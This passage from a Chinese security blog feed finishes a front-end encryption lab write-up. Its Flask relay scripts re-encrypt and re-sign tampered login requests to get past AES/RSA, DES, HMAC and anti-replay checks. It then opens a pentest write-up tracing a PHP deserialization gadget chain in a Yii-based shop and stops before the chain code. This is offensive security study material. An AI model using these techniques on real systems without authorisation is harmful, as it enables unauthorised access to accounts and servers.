aes 加密后的明文一起发送到服务端</p><p>私钥放在服务端，获取不了，这里无法对 iv 和 key 进行解密，所以就不能修改请求包，所以只能在进行加密的时候获取或者固定 iv 和 key，然后修改请求包</p><h3 id="接口加密实现-1"><a href="#接口加密实现-1" class="headerlink" title="接口加密实现"></a>接口加密实现</h3><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">from Cryptodome.PublicKey import RSA</span><br><span class="line">from Cryptodome.Cipher import PKCS1_v1_5</span><br><span class="line">from Cryptodome.Cipher import AES</span><br><span class="line">from Cryptodome.Util import Padding</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import base64</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 公钥 (PEM 格式)</span><br><span class="line">public_key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="line">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="line">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="line">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">secret_key = b&quot;1234567890123456&quot;</span><br><span class="line">iv = b&quot;1234567890123456&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rsa_encrypt(s):</span><br><span class="line">    # 加载公钥</span><br><span class="line">    public_key_obj = RSA.import_key(public_key)</span><br><span class="line"></span><br><span class="line">    # 创建加密对象，使用 PKCS1_v1_5 模式</span><br><span class="line">    cipher = PKCS1_v1_5.new(public_key_obj)</span><br><span class="line"></span><br><span class="line">    # 对明文进行加密</span><br><span class="line">    encrypted_data = cipher.encrypt(s.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">    # 将加密后的数据转为 Base64 编码</span><br><span class="line">    encrypted_base64 = b64encode(encrypted_data).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">    return encrypted_base64</span><br><span class="line"></span><br><span class="line">def aes_encrypt(s):</span><br><span class="line">    k = AES.new(secret_key,AES.MODE_CBC,iv)</span><br><span class="line">    padded_s = Padding.pad(s.encode(&quot;UTF-8&quot;),AES.block_size,&quot;pkcs7&quot;)</span><br><span class="line">    en = k.encrypt(padded_s)</span><br><span class="line">    return base64.encodebytes(en).decode().strip(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    encry_param = aes_encrypt(param.strip(&quot;\n&quot;))</span><br><span class="line"></span><br><span class="line">    encry_key = rsa_encrypt(b64encode(secret_key).decode())</span><br><span class="line">    encry_iv = rsa_encrypt(b64encode(iv).decode())</span><br><span class="line">    print(param)</span><br><span class="line">    respose = &#123;&quot;encryptedData&quot;:encry_param,&quot;encryptedKey&quot;:encry_key,&quot;encryptedIv&quot;:encry_iv&#125;</span><br><span class="line">    print(json.dumps(respose))</span><br><span class="line">    return json.dumps(respose)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114436246.png" class=""><h2 id="DES-加密"><a href="#DES-加密" class="headerlink" title="DES 加密"></a>DES 加密</h2><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114442241.png" class=""><p>定位加密函数encryptAndSendDataDES</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114448438.png" class=""><p>分析发现是根据 username 动态生成 iv 和 key，chatgpt 解释如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">密钥（_0x28853a）</span><br><span class="line">从用户名的前8个字符生成（_0x54dcc5.slice(0x0, 0x8)）。</span><br><span class="line">不足8位的部分使用字符&#x27;6&#x27;填充（padEnd(0x8, &#x27;6&#x27;)）。</span><br><span class="line">经过CryptoJS.enc.Utf8.parse转为UTF-8格式。</span><br><span class="line">初始向量（IV，_0x360c3f）</span><br><span class="line">由字符串&#x27;9999&#x27;和用户名的前4个字符拼接而成。</span><br><span class="line">如果不足4位，则用字符&#x27;9&#x27;填充（padEnd(0x4, &#x27;9&#x27;)）。</span><br><span class="line">转为UTF-8格式。</span><br></pre></td></tr></table></figure><p>然后把 password 进行 des 加密然后转为 hex</p><h3 id="接口加密实现-2"><a href="#接口加密实现-2" class="headerlink" title="接口加密实现"></a>接口加密实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import json</span><br><span class="line">from flask import Flask,request</span><br><span class="line">from pyDes import *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def des_encrypt(username,password):</span><br><span class="line">    key = username[:8].ljust(8,&quot;6&quot;).encode(&quot;UTF-8&quot;)</span><br><span class="line">    iv = (&quot;9999&quot;+username[:4].rjust(4,&quot;9&quot;)).encode(&quot;UTF-8&quot;)</span><br><span class="line">    k = des(key, CBC, iv, pad=None, padmode=PAD_PKCS5)</span><br><span class="line">    en = k.encrypt(password, padmode=PAD_PKCS5)</span><br><span class="line">    return en.hex()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    username = json.loads(param)[&#x27;username&#x27;]</span><br><span class="line">    password = json.loads(param)[&#x27;password&#x27;]</span><br><span class="line">    encry_param = des_encrypt(username,password)</span><br><span class="line">    print(param)</span><br><span class="line">    respose = &#123;&quot;username&quot;:username,&quot;password&quot;:encry_param&#125;</span><br><span class="line">    print(json.dumps(respose))</span><br><span class="line">    return json.dumps(respose)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><p>这里因为不好弄插件识别关键词只实现了加密功能</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114500102.png" class=""><h2 id="明文加签"><a href="#明文加签" class="headerlink" title="明文加签"></a>明文加签</h2><p>请求包如下</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114506326.png" class=""><p>搜索 signature 定位函数sendDataWithNonce</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114512332.png" class=""><p>先生成随机数（<code>nonce</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const _0x3db627 = Math.random().toString(0x24).substring(0x2);</span><br></pre></td></tr></table></figure><ul><li>调用<code>Math.random()</code>生成一个随机数，返回一个介于<code>0</code>和<code>1</code>之间的小数。</li><li>使用<code>toString(0x24)</code>将随机数转换为<strong>36进制</strong>字符串。</li><li>调用<code>substring(0x2)</code>截取字符串，从索引<code>2</code>开始（去掉”0.”前缀）。</li><li>结果保存在变量<code>_0x3db627</code>，作为<code>nonce</code>（一次性随机数）。</li></ul><p>生成时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const _0x1a525d = Math.floor(Date.now() / 0x3e8);</span><br></pre></td></tr></table></figure><ul><li>调用<code>Date.now()</code>获取当前的时间戳（以毫秒为单位）。</li><li>将时间戳除以<code>0x3e8</code>（十进制<code>1000</code>），转换为以秒为单位的时间戳。</li><li>使用<code>Math.floor</code>取整，存储在<code>_0x1a525d</code>。</li></ul><p>计算签名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const _0xaf577e = _0x2547ae + _0x52eec5 + _0x3db627 + _0x1a525d;</span><br><span class="line">const _0x2ab511 = CryptoJS.HmacSHA256(_0xaf577e, &#x27;be56e057f20f883e&#x27;).toString(CryptoJS.enc.Hex);</span><br></pre></td></tr></table></figure><ul><li><strong>构造待签名字符串</strong>：</li><li>将用户名、密码、随机数<code>nonce</code>、时间戳连接成一个字符串，存储在<code>_0xaf577e</code>中。</li><li><strong>生成HMAC签名</strong>：</li><li>使用<code>CryptoJS.HmacSHA256</code>函数对字符串<code>_0xaf577e</code>进行HMAC-SHA256哈希。</li><li>使用<code>&#39;be56e057f20f883e&#39;</code>作为签名密钥。</li><li>将哈希结果转换为十六进制字符串格式，存储在<code>_0x2ab511</code>。</li></ul><h3 id="接口加密实现-3"><a href="#接口加密实现-3" class="headerlink" title="接口加密实现"></a>接口加密实现</h3><p>这里能重放，就固定随机数，现在只需要将参数和随机数时间戳拼接起签名就行</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114539911.png" class=""><p>username+password+35i95iq19b6+timestamp</p><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">nonce = &#x27;35i95iq19b6&#x27;</span><br><span class="line">key = &#x27;be56e057f20f883e&#x27;</span><br><span class="line"></span><br><span class="line">def sha256_encrypt(username,password,timestamp):</span><br><span class="line">    key_bytes = key.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    message = username + password + nonce + str(timestamp)</span><br><span class="line"></span><br><span class="line">    print(message)</span><br><span class="line">    message_bytes = message.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    signature = hmac.new(key_bytes, message_bytes, hashlib.sha256).hexdigest()</span><br><span class="line">    return signature</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    username = json.loads(param)[&#x27;username&#x27;]</span><br><span class="line">    password = json.loads(param)[&#x27;password&#x27;]</span><br><span class="line">    timestamp = int(time.time())</span><br><span class="line">    signature_param = sha256_encrypt(username,password,timestamp)</span><br><span class="line">    print(param)</span><br><span class="line">    respose = &#123;&quot;username&quot;:username,&quot;password&quot;:password,&quot;nonce&quot;:nonce,&quot;timestamp&quot;:timestamp,&quot;signature&quot;:signature_param&#125;</span><br><span class="line">    print(json.dumps(respose))</span><br><span class="line">    return json.dumps(respose)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><h2 id="加签-key-在服务端"><a href="#加签-key-在服务端" class="headerlink" title="加签 key 在服务端"></a>加签 key 在服务端</h2><p>请求包如下，先获取签名</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114528610.png" class=""><p>然后再拼在一起发送到服务端，这样直接写个中转服务端就行，先获取签名然后拼在一起发送请求包</p><h3 id="接口加密实现-4"><a href="#接口加密实现-4" class="headerlink" title="接口加密实现"></a>接口加密实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">get_signature_url= &#x27;http://82.156.57.228:43899/encrypt/get-signature.php&#x27;</span><br><span class="line"></span><br><span class="line">def get_signature(username,password,timestamp):</span><br><span class="line">    data = &#123;&quot;username&quot;:username,&quot;password&quot;:password,&quot;timestamp&quot;:timestamp&#125;</span><br><span class="line">    rep = requests.post(get_signature_url,json=data)</span><br><span class="line">    signature = json.loads(rep.text)[&#x27;signature&#x27;]</span><br><span class="line">    return signature</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    username = json.loads(param)[&#x27;username&#x27;]</span><br><span class="line">    password = json.loads(param)[&#x27;password&#x27;]</span><br><span class="line">    timestamp = int(time.time())</span><br><span class="line">    signature_param = get_signature(username,password,timestamp)</span><br><span class="line">    print(param)</span><br><span class="line">    respose = &#123;&quot;username&quot;:username,&quot;password&quot;:password,&quot;timestamp&quot;:timestamp,&quot;signature&quot;:signature_param&#125;</span><br><span class="line">    print(json.dumps(respose))</span><br><span class="line">    return json.dumps(respose)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure><h2 id="禁止重放"><a href="#禁止重放" class="headerlink" title="禁止重放"></a>禁止重放</h2><p>请求包如下</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114619237.png" class=""><p>再次发送，报错</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114627853.png" class=""><p>定位到sendLoginRequest 函数</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114634769.png" class=""><p>搜索generateRequestData 函数</p><img src="/2024/11/20/%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/file-20241120114641010.png" class=""><p>这里就是用 rsa 加密时间戳进行防止重放攻击</p><p>绕过的话就再中转服务器每次重新 rsa 加密当前时间戳就行</p><h3 id="接口加密实现-5"><a href="#接口加密实现-5" class="headerlink" title="接口加密实现"></a>接口加密实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">from Cryptodome.PublicKey import RSA</span><br><span class="line">from Cryptodome.Cipher import PKCS1_v1_5</span><br><span class="line">from base64 import b64encode</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 公钥 (PEM 格式)</span><br><span class="line">public_key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="line">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="line">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="line">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def rsa_encrypt(s):</span><br><span class="line">    # 加载公钥</span><br><span class="line">    public_key_obj = RSA.import_key(public_key)</span><br><span class="line"></span><br><span class="line">    # 创建加密对象，使用 PKCS1_v1_5 模式</span><br><span class="line">    cipher = PKCS1_v1_5.new(public_key_obj)</span><br><span class="line"></span><br><span class="line">    # 对明文进行加密</span><br><span class="line">    encrypted_data = cipher.encrypt(s.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">    # 将加密后的数据转为 Base64 编码</span><br><span class="line">    encrypted_base64 = b64encode(encrypted_data).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">    return encrypted_base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/encode&#x27;,methods=[&quot;POST&quot;])</span><br><span class="line">def encrypt():</span><br><span class="line">    param = request.form.get(&#x27;dataBody&#x27;)  # 获取body</span><br><span class="line">    username = json.loads(param)[&#x27;username&#x27;]</span><br><span class="line">    password = json.loads(param)[&#x27;password&#x27;]</span><br><span class="line">    timestamp = str(int(time.time() * 1000))</span><br><span class="line">    random = rsa_encrypt(timestamp)</span><br><span class="line">    print(param)</span><br><span class="line">    respose = &#123;&quot;username&quot;:username,&quot;password&quot;:password,&quot;random&quot;:random&#125;</span><br><span class="line">    print(json.dumps(respose))</span><br><span class="line">    return json.dumps(respose)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True # 设置调试模式，生产模式的时候要关掉debug</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次禾匠商城yii反序列化链挖掘</title>
      <link href="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/"/>
      <url>/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<p>一次项目中遇到了禾匠商城，翻到文章记录了两个历史漏洞，一个密码重置和反序列化，因为不知道管理员用户名，就尝试利用反序列化漏洞。</p><h2 id="反序列化漏洞点"><a href="#反序列化漏洞点" class="headerlink" title="反序列化漏洞点"></a>反序列化漏洞点</h2><p><a href="https://www.freebuf.com/articles/network/334859.html">https://www.freebuf.com/articles/network/334859.html</a><br>定位到漏洞文件controllers&#x2F;api&#x2F;testOrderSubmit&#x2F;IndexController.php</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009101750162.png" class=""><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009101841935.png" class=""><p>跟踪decode方法，这是YII处理序列化数据的典型办法，可以看到如果json_decode失败会调用原生的unserialize来进行反序列化，这就会造成反序列化漏洞了。<br>因为IndexController没有绑定login的behaviors行为，所以这个反序列化是未授权的漏洞。</p><h2 id="目标环境限制"><a href="#目标环境限制" class="headerlink" title="目标环境限制"></a>目标环境限制</h2><p>尝试用文章中的链进行利用，发现失败，有多个限制<br>目标环境设置了disable_functions，php版本是7，<br>BatchQueryResult和FnStream也修复了，增加了__wakeup方法使其不能反序列化</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009103037630.png" class=""><p>并且yii反序列化链中的类在禾匠商城中有很多找不到<br>所以需要重新挖掘yii的其他利用链</p><h2 id="反序列化链挖掘"><a href="#反序列化链挖掘" class="headerlink" title="反序列化链挖掘"></a>反序列化链挖掘</h2><h3 id="TemporaryFileByteStream入口点"><a href="#TemporaryFileByteStream入口点" class="headerlink" title="TemporaryFileByteStream入口点"></a>TemporaryFileByteStream入口点</h3><p>通过翻阅文章和审计代码，找到<a href="https://www.anquanke.com/post/id/254429#h2-19">https://www.anquanke.com/post/id/254429#h2-19</a><br>文章中的TemporaryFileByteStream入口点</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009104229868.png" class=""><p>因为这里调用了file_exists代表需要的参数是string类型，这里getPath()返回可控，所以这里就可以执行任意类的__toString方法</p><h3 id="AppendStream"><a href="#AppendStream" class="headerlink" title="AppendStream"></a>AppendStream</h3><p>这里选择的是调用GuzzleHttp\Psr7\AppendStream的__toString方法</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009105001197.png" class=""><p>这里执行顺序为<br>vendor\guzzlehttp\psr7\src\AppendStream.php-&gt;__tostring()-&gt;rewind()-&gt;seek()</p><p>然后这里stream可控，所以这里可以调用任意类的rewind方法</p><h3 id="CachingStream-rewind"><a href="#CachingStream-rewind" class="headerlink" title="CachingStream-&gt;rewind()"></a>CachingStream-&gt;rewind()</h3><p>调用CachingStream的rewind方法</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009110123633.png" class=""><p>执行顺序为\vendor\guzzlehttp\psr7\src\CachingStream.php-&gt;rewind()-&gt;seek()-&gt;read()<br>这里stream可控所以就可以调用任意类的read方法<br>要执行到read方法要求diff大于0并且满足while条件<br>在其他文章中都是调用Faker\DefaultGenerator类，但是禾匠商城没有这个类，这里选择的是GuzzleHttp\Psr7\BufferStream替代</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009111749641.png" class=""><p>目前反序列化链demo如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 